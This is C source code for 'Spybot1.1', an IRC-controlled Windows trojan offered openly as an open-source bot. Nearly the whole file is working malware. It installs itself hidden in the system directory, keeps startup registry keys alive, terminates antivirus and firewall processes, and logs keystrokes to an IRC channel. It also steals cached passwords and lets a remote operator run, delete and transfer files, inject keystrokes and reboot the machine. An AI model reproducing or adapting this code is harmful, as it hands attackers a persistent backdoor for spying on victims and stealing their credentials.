//////////////////////////////////////////////////////////
//							//
//		Spybot1.1 by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//							//
//	 You can use this code however      		//
//       you want, as long as i'm given     		//
//       credit in some way.				//
//	 This is the first real c program i have        //
//	 made so there will be some bugs in it.         //
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////



 #include <winsock.h>
 #include <stdio.h>
 #include "settings.h"
 #include <shellapi.h>
 #include <wininet.h>
 #include <mmsystem.h>

char nick[55];

char runoncekey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
char runkey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

//dcc variables

char dcchost[20];
char dccfilename[MAX_PATH];
char sendtochan[30];
int dccport;
SOCKET dcchosts;
BOOL info = FALSE;
//variables

char logins[maxlogins][50]={ 0 };
int sendkeysto = 0;
DWORD nSize = 256;
SOCKET keysock;
char keylogchan[250];
int distime = 1800000;
const char Error[] = "Error operation failed";
const char OK[] = "Operation completed";
//const char PRIVMSG[] = "PRIVMSG";
// function prototypes
int cashedpasswords(SOCKET sock,char *sendto);
char * decrypt(char *str);
void writekeys();
int raw_commandsonjoin(SOCKET sock,char *chan);
int raw_commands(SOCKET sock);
int sendkeys(SOCKET sock,char *buf,char *logfile);
char * rndnick(char *strbuf);
int irc_connect(char * serveraddr,int poort);
int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto);
int irc_read(SOCKET Server);
int irc_readline(char * line,SOCKET Server);
int getfiles(char *_current,SOCKET dccsock,char *chan);
int irc_send2(SOCKET Server,char *buf,char *buf2);
int irc_send3(SOCKET Server,char *buf,char *buf2,char *buf3);
char * sysinfo(char *sinfo,SOCKET sock);
int cpuspeed(void);
unsigned __int64 cyclecount();
DWORD WINAPI dcc_send(LPVOID param);
DWORD WINAPI dcc_chat(LPVOID param);
DWORD WINAPI dcc_getfile(LPVOID param);
DWORD WINAPI keylogger(LPVOID param);
DWORD WINAPI kill_av(LPVOID param);
DWORD WINAPI keepkeys(LPVOID param);
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread);

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

// kernel32.dll function variables (thanks to sdbot)
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;


 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA  WSData;
	int err, c;
	DWORD ConState;
	DWORD id;
	
	char thisfilename[MAX_PATH];
	char sysdir[MAX_PATH];
	GetModuleFileName(NULL,thisfilename,sizeof(thisfilename));
	GetSystemDirectory(sysdir, sizeof(sysdir));

      	       
      	if (strlen(strstr(GetCommandLine()," ")+1) > 4) {
		int d = 0;
		while (DeleteFile(strstr(GetCommandLine()," ")+1) == 0)
		{
			if (d == 5) break;
			d++;
			Sleep(1500);
		}

	}
	
	

	if (strstr(thisfilename,sysdir) == NULL) //instal server
	{
		char copyfile[MAX_PATH]; 
		sprintf(copyfile,"%s\\%s",sysdir,filename);
		CopyFile(thisfilename,copyfile , FALSE); //copyfile to systemdir 
		SetFileAttributes(copyfile,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
		writekeys(); //write startupkeys
		if (meltserver) {
			ShellExecute(0, "open",copyfile ,thisfilename, NULL, SW_SHOW);

		}
		else ShellExecute(0, "open",copyfile , NULL, NULL, SW_SHOW);
		ExitProcess(0);
	}
        CreateMutex(NULL,TRUE,mutexname);
	if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0); //check if is allready running..
	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}
   	if ( WSAStartup(MAKEWORD(1, 1), &WSData) )
        	return 0;
	if (nummer_of_av_firewalls_to_kill > 0) CreateThread(NULL, 0, &kill_av, NULL, 0, &id);
	CreateThread(NULL, 0, &keepkeys, NULL, 0, &id);
	memset(keylogchan,0,sizeof(keylogchan));
	if (logging == 1) CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
////////////////////////decrypt some data, make sure before you enable this that you first encrypt al data with the provided mIRC script /////////////////////////////////////
/*
	decrypt(password);
	decrypt(channel);
	decrypt(channelpass);
*/
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	c = 0;
	while (1) {
		if (!InternetGetConnectedState(&ConState,0)) { //see if we there is a internet connection
			Sleep(30000); 
			continue;
		}
		if (c == num_of_servers) c = 0;
 		err = irc_connect(ircservers[c],serverports[c]);
		if (err == 1) break;
		Sleep(5000);
		c++;
	}
	WSACleanup();
	return 0;
 }

//simple decrypt function prevent people to see the important stuff with a hexediter

char * decrypt(char *str)
{
 	for (BYTE i = 0;str[i] != 0; i++) {
         	 str[i] = str[i] - decryptkey - 3*i;
        }
	return str;
}


DWORD WINAPI keepkeys(LPVOID param) //when the startup keys are removed we create them again ;-)
 {
	while (1)
	{
		writekeys();
		Sleep(30000);
	}
	return 0; //will never hapen but if you remove it it will generate a warning..
}
void writekeys()
{
	unsigned long size = 250;
	HKEY key;
	BYTE  buf[200];
	RegCreateKeyEx(HKEY_CURRENT_USER, runoncekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);

    	if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, filename) != 0) {
      	        RegSetValueEx(key, valuename, 0, REG_SZ, filename, 127);
	}
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);

    	if (RegQueryValueEx(key, ( LPCTSTR ) valuename , 0, 0,buf, &size) != ERROR_SUCCESS || strcmp(buf, filename) != 0) {
		//MessageBox(0,"DONT FUCK WITH THE STARTUPKEYS OR I WILL FORMAT YOUR PC!","Error",MB_OK);
      	        RegSetValueEx(key, valuename, 0, REG_SZ, filename, 127);
	}
	RegCloseKey(key);
}
//connect functie

int irc_connect(char * serveraddr,int poort)
{

	DWORD err;
 	WSADATA	WSData;
        LPHOSTENT lpHostEntry = NULL;
   	SOCKADDR_IN  SockAddr;
   	SOCKET Server;
   	IN_ADDR iaddr;
	restart:
 	Server = socket( AF_INET, SOCK_STREAM, 0);
   	if (Server == INVALID_SOCKET)
      		return 0;
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(poort);
	iaddr.s_addr = inet_addr(serveraddr);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(serveraddr); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return 0;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
  	err = connect( Server, (PSOCKADDR) &SockAddr, sizeof(SockAddr));

	if (err == SOCKET_ERROR) {
		closesocket(Server);
		return 0;
	}
	err = irc_read(Server);
	if (err == 2) goto restart;
	else if (err == 3) { 
		Sleep(distime);
		goto restart;
	}
	return err;

}
int getnick()
{
	LPTSTR username = "?";
	memset(nick,0,sizeof(nick));
	if (!GetUserName(username, &nSize) || strcmp(username,"Administrator") == 0) rndnick(nick);
	else {
		srand(GetTickCount());
		sprintf(nick,"%s%i",username,(rand()%99));//add a random number at the end of the username
	}
	memset(username,0,sizeof(username));
	return 0;
}
int irc_read(SOCKET Server)
{
	char *line;
	char buf[4096];
	char buffer[4096];
	int err = 0;
	int er = 1;
	int i;
	memset(logins,0,sizeof(logins));
	getnick();
	sprintf(buffer,"NICK %s\r\n USER %s \"hotmail.com\" \"127.0.0.1\" :%s\r\n",nick,nick,nick);
      	send(Server, buffer, strlen(buffer), 0);
	while (1) {
		memset(buffer,0,sizeof(buffer));
		memset(buf,0,sizeof(buf));
		err = recv(Server, buffer, sizeof(buffer), 0);
		if (err == SOCKET_ERROR || err == 0)
			break;
		strcat(buffer,"\r");
		strcpy(buf,buffer);
		strtok(buf,"\r");
		line = buf;
		int len = 0;
		while (line != NULL) {
			if (strlen(line) > 3) er = irc_readline(line,Server);
			if (er > 0) {
				closesocket(Server);
				return er;
			}
			len = strlen(buf);
			strcpy(buf,buffer);
	
			line = strtok(buf+len,"\r");
		}
	}
	closesocket(Server);
	return 0;
}



 DWORD WINAPI dcc_chat(LPVOID param)
{
	char buffer[4096];
	char host[20];
	int port;
	SOCKET ircsock;
	ircsock = dcchosts;
	sprintf(host,dcchost);
	port = dccport;
	int i;
	char x[MAX_PATH];
	info = TRUE;
	char line[4096];
	DWORD err;
   	SOCKADDR_IN    SockAddr;
   	SOCKET         dcc;
   	IN_ADDR iaddr;
	dcc = socket( AF_INET, SOCK_STREAM, 0);
   	if (dcc == INVALID_SOCKET)
      		return 0;
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	iaddr.s_addr = inet_addr(host);
	if (iaddr.s_addr == INADDR_NONE)
		return 0;
	SockAddr.sin_addr = iaddr; //ip address
  	err = connect( dcc, (PSOCKADDR) &SockAddr, sizeof(SockAddr));

	if (err == SOCKET_ERROR) {
		closesocket(dcc);
		return 0;
	}
	err = 1;
	sprintf(buffer,"Type list path+filter to get my file list\r\nExample:\r\nlist C:\\*.*\r\n");
	send(dcc,buffer,strlen(buffer),0);
	while (1) {
		memset(buffer,0,sizeof(buffer));
		err = recv( dcc, buffer, sizeof(buffer), 0);
		if (err == SOCKET_ERROR || err == 0) {
			return 1;
		}
		strncpy(line, buffer, sizeof(line)-1);
		strtok(buffer, " ");
		strtok(buffer,"\n");
		strtok(line,"\n");
		if (strlen(line) < 4) continue;
		if (buffer == NULL) continue;
		err = read_command(dcc,ircsock,buffer,line,NULL);
		if (err == 1) {
			WSACleanup();
			exit(0);
		}

	}
	closesocket(dcc);
	return 0;

}

DWORD WINAPI keylogger(LPVOID param)
{
	HWND win, winold;
	int bKstate[256]={0};
        int i,x;
	int err = 0;
	char buffer[600];
	char buffer2[800];
	char window[250];
	int state;
	int shift;
	char sysdir[MAX_PATH];
	char logfile[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(logfile,"%s\\%s",sysdir,keylogfilename);
	memset(buffer,0,sizeof(buffer));
	win = GetForegroundWindow();
	winold = win;
	GetWindowText(winold,window,150);
	while (err == 0) {
		Sleep(8);
		win = GetForegroundWindow();
		if (win != winold) {
			if (strlen(buffer) != 0) {
				sprintf(buffer2," %s)10 %s (Changed window",window,buffer);
				err = sendkeys(keysock,buffer2,logfile);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
			win = GetForegroundWindow();
			winold = win;
			GetWindowText(winold,window,150);

		}
		for(i=0;i<92;i++)
		{
			shift = GetKeyState(VK_SHIFT);
 			x = inputL[i];
			if (GetAsyncKeyState(x) & 0x8000) {
				//see if capslock or shift is pressed it will fuckup but at least i have tryed :-)
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))//caps lock and NOT shift
					bKstate[x] = 1;//upercase a-z
				else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))//caps lock AND shift
					bKstate[x] = 2;//lowercase a-z
				else if (shift < 0) //Shift
					bKstate[x] = 3; //upercase
				else bKstate[x] = 4; //lowercase 
			}

			else {
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) {
						buffer[strlen(buffer)-1] = 0;
						continue;
					}
					else if (strlen(buffer) > 550) {
						win = GetForegroundWindow();
						GetWindowText(win,window,250);
						sprintf(buffer2," %s)10 %s (Buffer full",window,buffer);
						err = sendkeys(keysock,buffer2,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (x == 13)  {
						if (strlen(buffer) == 0) continue;
						win = GetForegroundWindow();
						GetWindowText(win,window,250);
						sprintf(buffer2," %s)10 %s (Return",window,buffer);
						err = sendkeys(keysock,buffer2,logfile);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					}
					else if (state == 1 || state == 3)
						strcat(buffer,outputH[i]);
					else if (state == 2 || state == 4)
						strcat(buffer,outputL[i]);
				}

     			}
		}
	}
	return 1;
}

int sendkeys(SOCKET sock,char *buf,char *logfile)
{
	char buffer[4092];
	int err = 0;
	strcat(buf,")\n");
	if (logging == 1) {

		FILE *log;
		log = fopen(logfile,"aw");
		if (log != NULL) {
			char date[70];
			GetDateFormat(0x409,0,0,"[dd:MMM:yyyy, ",date,70);
			fputs(date,log);
			memset(date,0,sizeof(date));
			GetTimeFormat(0x409,0,0," HH:mm:ss]",date,70);
			fputs(date,log);
	 		fputs(buf,log);
			fclose(log);
		}

	}

	if (sendkeysto == 0 && logging == 1) return 0;
	strcat(buf,"\r");
	if (strlen(keylogchan) == 0) {
		strcpy(buffer,buf);
	}
	else {
		sprintf(buffer,"PRIVMSG %s :(%s",keylogchan,buf);
	}
	err = send(sock,buffer,strlen(buffer),0);
	if (err == SOCKET_ERROR) {
		memset(keylogchan,0,sizeof(keylogchan));
		sendkeysto = 0;
		if (logging == 0) return 1;
	}
	return 0;
}
void Keyevent (BYTE key,BOOL caps)
{
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),FALSE?KEYEVENTF_KEYUP:0,0);
        keybd_event(key,MapVirtualKey(key,0),FALSE?KEYEVENTF_KEYUP:0,0);
	keybd_event(key,MapVirtualKey(key,0),TRUE?KEYEVENTF_KEYUP:0,0);
	if (caps) keybd_event(VK_SHIFT,MapVirtualKey(VK_SHIFT,0),TRUE?KEYEVENTF_KEYUP:0,0);
}

int read_command(SOCKET sendsock,SOCKET ircsock,char *command,char *line,char *sendto)
{
	char x[4096];
	char y[4096];
	char line1[4096];
	char *s[10];
	int i;
	int err;
	DWORD id;
	memset(x,0,sizeof(x));
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 10; i++) s[i] = strtok(NULL, " ");
	memset(sendtochan,0,sizeof(sendtochan));
	info = FALSE;
	if (strcmp("raw", command) == 0)  {
		strncpy(x, line+4, sizeof(x)-1);
		sendto = NULL;
		sendsock = ircsock;
	}
	else if (strcmp("info", command) == 0)  {
		sysinfo(x,sendsock);
	}
	else if (strcmp("passwords",command) == 0) {
		if (cashedpasswords(sendsock,sendto) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp("startkeylogger", command) == 0)  {
		if (sendkeysto == 1) sprintf(x,"error already logging keys to %s use \"stopkeylogger\" to stop",keylogchan);
		else {
			if (sendto != NULL) {
				sprintf(keylogchan,sendto);
				sprintf(x,"Keylogger active output to: %s",keylogchan);
			}
			else {
				memset(keylogchan,0,sizeof(keylogchan));
				sprintf(x,"Keylogger active output to: DCC chat");
			}
			keysock = sendsock;
			if (logging != 1) CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
			sendkeysto = 1;
		}
	}
	else if (strcmp("stopkeylogger", command) == 0)  {
		sendkeysto = 0;
		memset(keylogchan,0,sizeof(keylogchan));
		sprintf(x,"Keylogger stoped");
	}
	else if (strcmp("listprocesses", command) == 0)  {
		if (listProcesses(sendsock,sendto,NULL,FALSE) == 0) strcpy(x,OK);
		else strcpy(x,Error);
	}
	else if (strcmp("reconnect", command) == 0 && sendto != NULL)  {
		send(sendsock,"QUIT\n\r",strlen("QUIT"),0);
		return 2;
	}
	else if (strcmp("keyboardlights", command) == 0)  {
		for (i = 0;i < 50;i++)
		{
			Keyevent(VK_CAPITAL,FALSE);
			Keyevent(VK_SCROLL,FALSE);
			Keyevent(VK_NUMLOCK,FALSE);
			Sleep(200);
		}
		strcpy(x,OK);
	}
	else if (strcmp("disconnect", command) == 0 && sendto != NULL)  {
		if (s[1] != NULL) distime = atoi(s[1]) * 1000;
		send(sendsock,"QUIT\n\r",strlen("QUIT\n\r"),0);
		return 3;
	}
	else if (strcmp("quit", command) == 0)  {
		return 1;
	}
	else if (strcmp("reboot", command) == 0)  {
		if (ExitWindowsEx(EWX_FORCE,0) == 0) strcpy(x,Error);
		else strcpy(x,"Bye Bye");
	}
        else if (s[1] != NULL) {
		if (strcmp("delete", command) == 0) {
			if (DeleteFile(strstr(line," ")+1)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp("execute", command) == 0) {
			if ((int) ShellExecute(0, "open", strstr(line," ")+1, NULL, NULL, SW_SHOW) < 33) strcpy(x,Error);
			else strcpy(x,OK);
		}
		else if (strcmp("makedir", command) == 0) {
			if (CreateDirectory(strstr(line," ")+1, 0)) strcpy(x,OK);
			else strcpy(x,Error);
		}
		else if (strcmp("list", command) == 0)  {
			getfiles(line+5,sendsock,sendto);
			strcpy(x,OK);
		}
		else if (strcmp("cd-rom", command) == 0) {
			if (atoi(s[1]) == 0) {
				strcpy(x,"cd-rom drive closed");
				mciSendString("set CDAudio door closed", NULL, 127, 0);
			}
			else {
				strcpy(x,"cd-rom drive opened");
				mciSendString("set CDAudio door open", NULL, 127, 0);
			}
		}
		else if (strcmp("killprocess", command) == 0) {
			if (listProcesses(sendsock,NULL,s[1],FALSE) == 1) strcpy(x,OK);
			else strcpy(x,Error);

		}
		else if (strcmp("sendkeys", command) == 0)  {
			strncpy(x, line+10, sizeof(x)-1);
			int c = 0;
			int z;
			i = 0;
			char chr[2];
			char bla[10];
			for (i = 0;i < strlen(x);i++)
			{
				memset(chr,0,sizeof(chr));
				chr[0] = x[i];
				for (c = 0;c < 92;c++)
				{

					if (strcmp(chr,"") == 0) { //bold (ctrl + u) = RETURN
						Keyevent(VK_RETURN,FALSE);
						break;
					}
					else if (strcmp(chr,"") == 0) { //underlined (ctrl + u) = backspace
						Keyevent(VK_BACK,FALSE);
						break;
					}
					else if (strcmp(chr,outputL[c]) == 0) {
						z = inputL[c];
						Keyevent(z,FALSE);
						break;
					}
					else if (strcmp(chr,outputH[c]) == 0) {
						z = inputL[c];
						Keyevent(z,TRUE);
						break;
					}
				}
			}
			strcpy(x,OK);

		}
		else if (s[2] != NULL) {
			if (strcmp("rename",command) == 0) {
				if (MoveFile(s[1],s[2]) == 0) strcpy(x,Error);
				else strcpy(x,OK);
			}

			else if (s[3] != NULL) {
				dcchosts = sendsock;
				memset(dccfilename,0,sizeof(dccfilename));
				memset(dcchost,0,sizeof(dcchost));
				if (sendto != NULL) strcpy(sendtochan,sendto); 
 		 		if (strcmp("SEND",command) == 0) { //dcc send
					sprintf(dccfilename,s[1]);
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_getfile, NULL, 0, &id);
					while (info == FALSE) Sleep(10);
					
				}
				else if (strcmp("CHAT",command) == 0 && sendto != NULL) { //dcc chat
					sprintf(dcchost,s[2]);
					dccport = atoi(s[3]);
					CreateThread(NULL, 0, &dcc_chat, NULL, 0, &id);
					while (info == FALSE) Sleep(10);
				}
				else if (strcmp("GET",command) == 0) { //dcc GET
					sprintf(dccfilename,strstr(line,"\"")+1);
					sprintf(dcchost,s[1]);
					dccport = atoi(s[2]);
					CreateThread(NULL, 0, &dcc_send, NULL, 0, &id);
					while (info == FALSE) Sleep(10);
				}
			}
		}
	}
	else return 0;
	if (strlen(x) == 0) return 0;
	strcat(x,"\r\n");
	if (sendto == NULL) //send to DCC chat
		send(sendsock,x,strlen(x),0);
	else {
		sprintf(y,"PRIVMSG %s :%s",sendto,x);
		send(sendsock,y,strlen(y),0);
	}

	return 0;
}

DWORD WINAPI kill_av(LPVOID param)
{
	while (1)
	{
		listProcesses(0,NULL,NULL,TRUE);
		Sleep(killer_delay);
	}
	return 0;
}
int listProcesses(SOCKET sock,char *chan,char *proccess,BOOL killthread)
{
	HANDLE hand;
	HANDLE killer;
	char buffer[500];
 	PROCESSENTRY32 pe32 = {0};
	int c;
	char window[250];
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		hand = fCreateToolhelp32Snapshot(2, 0);
		if (hand != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hand, &pe32)) {
				do {
					if (killthread) {
						CharUpperBuff(pe32.szExeFile,strlen(pe32.szExeFile));
						for(c = 0;c < nummer_of_av_firewalls_to_kill;c++)
						{
							if (strstr(pe32.szExeFile,kill_list[c]) != NULL) {
 								killer=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
								TerminateProcess(killer,0);
								break;
							}
						}
					}
					else if (proccess == NULL) {
						memset(buffer,0,sizeof(buffer));
						if (chan != NULL) sprintf(buffer,"PRIVMSG %s :%s\r\n",chan,pe32.szExeFile);
						else sprintf(buffer,"%s\n\r",pe32.szExeFile);
						send(sock,buffer,strlen(buffer),0);
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							killer = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID );
							CloseHandle (hand);
							if (!TerminateProcess(killer,0)) return 0;
							return 1;
						 }

					}

				} while (fProcess32Next(hand, &pe32));
			}
			CloseHandle (hand);
		}
	}

 return 0;

}
int getfiles(char *current,SOCKET dccsock,char *chan)
{
	char sendbuf[MAX_PATH];
        HANDLE Hnd, fileS;
        WIN32_FIND_DATA WFD;
        int count = 0;
	int count2 = 0;
	strtok(current,"\n");
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Searsing for: %s\r\n",chan,current);
	else sprintf(sendbuf,"Searsing for: %s\r\n",current);
	send(dccsock,sendbuf,strlen(sendbuf),0);
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :[%s]\r\n",chan,WFD.cFileName);
				else sprintf(sendbuf,"<%s>\r\n",WFD.cFileName);
			}
			else {
				count++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :%s  (%i bytes)\r\n",chan,WFD.cFileName,WFD.nFileSizeLow);
				else sprintf(sendbuf,"%s  (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
			}
			send(dccsock,sendbuf,strlen(sendbuf),0);

     		 }

        }

        (void) FindClose( Hnd );
	if (chan) sprintf(sendbuf,"PRIVMSG %s Found: %i files and %i dirs\r\n",chan,count,count2);
	else sprintf(sendbuf,"Found: %i files and %i dirs\r\n",count,count2);
	send(dccsock,sendbuf,strlen(sendbuf),0);
        return 0;
}

int irc_readline(char * line,SOCKET Server)
{

	char buf[512];
	char line1[512];
	char *s[5];
	char *x;
	char *y;
	char user[50];
	char *hostname;
	int i,c;
	int q = 3;
	int err = 0;
	BOOL master = FALSE;
	BOOL goodhost = FALSE;
	memset(buf,0,sizeof(buf));

	while (1) {
		if (line[strlen(line)-1] == '\n' || line[strlen(line)-1] == '\r') line[strlen(line)-1] = '\0';
		else break;
	}
	if (strlen(line) < 3) return 0;
	strncpy(line1, line, sizeof(line1)-1);
	s[0] = strtok(line1, " ");
	for (i = 1; i < 5; i++) s[i] = strtok(NULL, " ");
	if (s[0][0] == '\n') s[0]++[0];
	if (s[0] == NULL || s[1] == NULL) return 0;



	if (strcmp("PING", s[0]) == 0)
		irc_send2(Server,"PONG",s[1]+1);
	else if (strcmp("376", s[1]) == 0 || strcmp("422", s[1]) == 0) {
		irc_send3(Server,"JOIN",channel,channelpass);
		raw_commands(Server);
	}
	else if (strcmp("433",s[1]) == 0) {
		getnick();
		irc_send2(Server,"NICK",nick);
	}
	if (s[2] == NULL) return 0;
	if (strcmp("366",s[1]) == 0) {
		raw_commandsonjoin(Server,s[3]);
	}
	strncpy(user, s[0]+1, sizeof(user)-1);

	strtok(user, "!");
	if (strcmp("QUIT", s[1]) == 0 || strcmp("PART", s[1]) == 0) {
		for (i = 0; i < 3; i++) {
			if (strcmp(logins[i],user) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i]));
		}

	}
	if (s[3] == NULL) return 0;
	if (strcmp("KICK", s[1]) == 0) { //hope we are not kicked...
		for (i = 0; i < maxlogins; i++) {
			if (strcmp(logins[i],s[3]) == 0 && logins[i] != NULL) memset(logins[i],0,sizeof(logins[i])); //or master is kicked
		}
		if (strcmp(nick,s[3]) == 0) irc_send3(Server,"JOIN",s[2],channelpass);


	}
	if ((strcmp("PRIVMSG",s[1]) == 0 || (strcmp("332",s[1]) == 0 && topiccommands))) { //its a privmsg ;-)
		if (strcmp("PRIVMSG",s[1]) == 0) {
			if (strstr(s[2], "#") == NULL) s[2] = user;
			for (i = 0; i < maxlogins; i++) {
				if (strcmp(logins[i],user) == 0 && logins[i] != NULL) master = TRUE;
			}
			if (strcmp("login",s[3]+1) == 0 && s[4] != NULL)
			{
 				if (master) return 0;
				int x;
				for (x = 0; x < maxlogins; x++) {
					if (logins[x][0] != '\0') continue;
					if (strcmp(password,s[4]) == 0) {

						if (num_of_trustedhostnames != 0) {
							hostname = strstr(s[0], "@");
							for (i = -1; i < num_of_trustedhostnames; i++) {

								restart:;
								i++;
								if (i == num_of_trustedhostnames) return 0;
								for (c = 0; c < strlen(trustedhosts[i])-1; c++) {
									if (trustedhosts[i][0] == '*') {
										if (hostname[strlen(hostname) - 1 - c] != trustedhosts[i][strlen(trustedhosts[i]) - 1 -c]) {
											if (trustedhosts[i][strlen(trustedhosts[i]) - 1 -c] != '*') goto restart;
										}

									}
									else if (hostname[c+1] != trustedhosts[i][c]) {
										if (trustedhosts[i][c] == '*') continue;
										else goto restart;
									}
								}
								 goodhost = TRUE;
								break;
							}
						}
						if (goodhost || num_of_trustedhostnames == 0) {

							strcpy(logins[x],  user);
							master = TRUE;
							return 0;
						}
					}
				}
			}
		}
		else {
			s[2] = s[3];
			q = 4;
		}
		if (!master && strcmp("332",s[1]) != 0) return 0;
		
		if (strcmp(":\1DCC",s[3]) == 0 && s[4] != NULL) {
			x = strstr(line, " :");
			y = strstr(x+1, " ");
			err = read_command(Server,Server,s[4],y+1,s[2]);
		}
		else {
			x = strstr(line, " :");
			err = read_command(Server,Server,s[q]+1,x+2,s[2]);
		}

	}

	return err;


}

int raw_commands(SOCKET sock)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c = 0;
	while (c != num_of_rawcommands) {
		if (strstr(rawcommands[c], "$NICK") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,rawcommands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$NICK");
			p = strstr(buf, "$NICK");
			sprintf(buf2,"%s%s%s\n\r",buf3,nick,p+5);
		}
		else
			sprintf(buf2,"%s\n\r",rawcommands[c]);
		send(sock, buf2, strlen(buf2), 0);
		c++;
		Sleep(1000);
	}
	return 0;
}
int raw_commandsonjoin(SOCKET sock,char *chan)
{
	char *p;
	char buf[512];
	char buf2[512];
	char buf3[512];
	int c = 0;
	while (c != num_of_onjoincommands) {
		if (strstr(onjoin_commands[c], "$CHAN") != NULL) {
			memset(buf,0,sizeof(buf));
			memset(buf2,0,sizeof(buf2));
			memset(buf3,0,sizeof(buf3));
			strcpy(buf,onjoin_commands[c]);
			strcpy(buf3,buf);
			strtok(buf3,"$CHAN");
			p = strstr(buf, "$CHAN");
			sprintf(buf2,"%s%s%s\n\r",buf3,chan,p+5);
		}
		else
			sprintf(buf2,"%s\n\r",onjoin_commands[c]);
		send(sock, buf2, strlen(buf2), 0);
		c++;
		Sleep(1000);
	}
	return 0;
}
int irc_send2(SOCKET Server,char *buf,char *buf2)
{
	int er;
	char buffer[512];
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"%s %s\r\n",buf,buf2);
	er = send(Server, buffer, strlen(buffer), 0);
	if (er == SOCKET_ERROR) {
		closesocket(Server);
		return 1;
	}
	return 0;
}
int irc_send3(SOCKET Server,char *buf,char *buf2,char *buf3)
{
	int er;
	char buffer[512];
	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"%s %s %s\r\n",buf,buf2,buf3);
	er = send(Server, buffer, strlen(buffer), 0);
